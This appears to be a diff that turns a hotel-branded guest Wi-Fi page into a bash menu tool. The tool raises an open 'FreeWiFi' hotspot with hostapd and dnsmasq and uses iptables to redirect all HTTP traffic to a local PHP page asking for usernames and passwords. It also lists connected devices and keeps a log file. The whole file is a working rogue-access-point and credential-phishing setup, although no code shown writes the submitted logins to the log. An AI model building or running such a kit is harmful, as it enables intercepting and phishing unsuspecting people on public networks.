@@ -1,95 +1,197 @@
+#!/bin/bash
+
+PORTAL_DIR="portal"
+LOG_FILE="logs/log.txt"
+HOTSPOT_IFACE="wlp4s0"
+SSID="FreeWiFi"
+
+HOSTAPD_CONF="/tmp/hostapd.conf"
+DNSMASQ_CONF="/tmp/dnsmasq.conf"
+
+# ---------------------------
+# Ensure portal and logs exist
+# ---------------------------
+ensure_directories() {
+    if [ ! -d "$PORTAL_DIR" ]; then
+        echo "[+] Portal folder missing. Creating..."
+        mkdir -p "$PORTAL_DIR"
+        echo "[+] Created $PORTAL_DIR"
+    fi
+
+    if [ ! -f "$PORTAL_DIR/index.php" ]; then
+        echo "[+] Creating default index.php for captive portal..."
+cat > "$PORTAL_DIR/index.php" <<EOF
+<?php
+// Apple captive portal detection
+if (\$_SERVER['REQUEST_URI'] == "/hotspot-detect.html") {
+    header("Location: /index.php");
+    exit;
+}
+// Normal login page
+include("index.html");
+?>
+EOF
+        echo "[+] index.php created"
+    fi
+
+    if [ ! -f "$PORTAL_DIR/index.html" ]; then
+        echo "[+] Creating basic index.html..."
+cat > "$PORTAL_DIR/index.html" <<EOF
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>WoodSprings Guest Wi‑Fi</title>
-<style>
-body {
-  margin: 0;
-  font-family: Arial;
-  background: url('https://images.unsplash.com/photo-1566073771259-6a8506099945') no-repeat center/cover;
-  height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-
-.box {
-  background: rgba(255,255,255,0.95);
-  padding: 30px;
-  border-radius: 12px;
-  width: 320px;
-  text-align: center;
-}
-
-h1 {
-  margin: 0;
-  color: #2a5298;
-}
-
-p {
-  color: #555;
-}
-
-input {
-  width: 100%;
-  padding: 10px;
-  margin: 8px 0;
-}
-
-button {
-  width: 100%;
-  padding: 10px;
-  background: #2a5298;
-  color: white;
-  border: none;
-  cursor: pointer;
-}
-
-.loading {
-  display: none;
-}
-</style>
+    <title>Login Page</title>
 </head>
-
 <body>
-
-<div class="box" id="loginBox">
-  <h1>WoodSprings</h1>
-  <p>Guest Wi‑Fi Access</p>
-
-  <form onsubmit="connect(event)">
-    <input type="text" placeholder="Room Number" required>
-    <input type="text" placeholder="Last Name" required>
-    <button type="submit">Connect</button>
-  </form>
-
-  <p style="font-size:12px;">Free internet for guests</p>
-</div>
-
-<div class="box loading" id="loadingBox">
-  <h1>Connecting...</h1>
-  <p>Please wait while we connect your device</p>
-</div>
-
-<div class="box loading" id="doneBox">
-  <h1>✅ Connected</h1>
-  <p>You now have internet access</p>
-</div>
-
-<script>
-function connect(e) {
-  e.preventDefault();
-
-  document.getElementById("loginBox").style.display = "none";
-  document.getElementById("loadingBox").style.display = "block";
-
-  setTimeout(() => {
-    document.getElementById("loadingBox").style.display = "none";
-    document.getElementById("doneBox").style.display = "block";
-  }, 2500);
-}
-</script>
-
+<h1>Welcome to Free WiFi</h1>
+<form method="POST">
+<input type="text" name="username" placeholder="Username"><br>
+<input type="password" name="password" placeholder="Password"><br>
+<input type="submit" value="Login">
+</form>
 </body>
 </html>
+EOF
+        echo "[+] index.html created"
+    fi
+
+    if [ ! -d "logs" ]; then
+        mkdir -p logs
+    fi
+
+    if [ ! -f "$LOG_FILE" ]; then
+        touch "$LOG_FILE"
+    fi
+}
+
+# ---------------------------
+# Setup dependencies
+# ---------------------------
+setup() {
+    echo "[+] Installing dependencies..."
+    sudo apt update
+    sudo apt install hostapd dnsmasq php-cli iptables -y
+    echo "[+] Setup complete!"
+}
+
+# ---------------------------
+# Create hostapd and dnsmasq configs
+# ---------------------------
+create_configs() {
+cat > $HOSTAPD_CONF <<EOF
+interface=$HOTSPOT_IFACE
+driver=nl80211
+ssid=$SSID
+hw_mode=g
+channel=6
+auth_algs=1
+ignore_broadcast_ssid=0
+EOF
+
+cat > $DNSMASQ_CONF <<EOF
+interface=$HOTSPOT_IFACE
+dhcp-range=192.168.50.2,192.168.50.50,255.255.255.0,12h
+EOF
+}
+
+# ---------------------------
+# Start hotspot + captive portal
+# ---------------------------
+start_hotspot() {
+    ensure_directories
+    echo "[+] Starting hotspot on $HOTSPOT_IFACE..."
+    create_configs
+
+    sudo ip link set $HOTSPOT_IFACE down
+    sudo ip addr flush dev $HOTSPOT_IFACE
+    sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
+    sudo ip link set $HOTSPOT_IFACE up
+
+    # Enable IP forwarding
+    sudo sysctl -w net.ipv4.ip_forward=1
+
+    # Start hostapd & dnsmasq
+    sudo hostapd $HOSTAPD_CONF -B
+    sudo dnsmasq -C $DNSMASQ_CONF
+
+    # Redirect all HTTP traffic to index.php
+    sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
+    sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE
+
+    echo "[+] Hotspot started with iOS-compatible captive portal."
+    echo "    Connect your device to SSID: $SSID"
+    echo "    Devices will be redirected to the login page automatically."
+}
+
+# ---------------------------
+# Stop hotspot
+# ---------------------------
+stop_hotspot() {
+    echo "[+] Stopping hotspot..."
+    sudo pkill hostapd
+    sudo pkill dnsmasq
+    sudo iptables -t nat -F
+    sudo iptables -t nat -X
+    sudo sysctl -w net.ipv4.ip_forward=0
+    echo "[+] Hotspot stopped."
+}
+
+# ---------------------------
+# Start PHP login page server
+# ---------------------------
+start_server() {
+    ensure_directories
+    cd "$PORTAL_DIR" || exit
+    php -S 0.0.0.0:80
+}
+
+# ---------------------------
+# Show connected devices
+# ---------------------------
+show_devices() {
+    echo "[+] Connected devices (DHCP leases):"
+    cat /var/lib/misc/dnsmasq.leases 2>/dev/null
+}
+
+# ---------------------------
+# Logs
+# ---------------------------
+view_logs() { cat "$LOG_FILE"; }
+live_logs() { tail -f "$LOG_FILE"; }
+
+# ---------------------------
+# Edit page
+# ---------------------------
+edit_page() { nano "$PORTAL_DIR/index.html"; }
+
+# ---------------------------
+# Main Menu
+# ---------------------------
+while true; do
+    echo ""
+    echo "====== iOS-Compatible Captive Portal Tool ======"
+    echo "1) Setup Dependencies"
+    echo "2) Start Hotspot + Captive Portal"
+    echo "3) Stop Hotspot"
+    echo "4) Start Login Page Server"
+    echo "5) Show Connected Devices"
+    echo "6) View Logs"
+    echo "7) Live Logs"
+    echo "8) Edit Login Page"
+    echo "9) Exit"
+    echo "==============================================="
+    read -p "Select option: " choice
+
+    case $choice in
+        1) setup ;;
+        2) start_hotspot ;;
+        3) stop_hotspot ;;
+        4) start_server ;;
+        5) show_devices ;;
+        6) view_logs ;;
+        7) live_logs ;;
+        8) edit_page ;;
+        9) exit ;;
+        *) echo "Invalid option" ;;
+    esac
+done
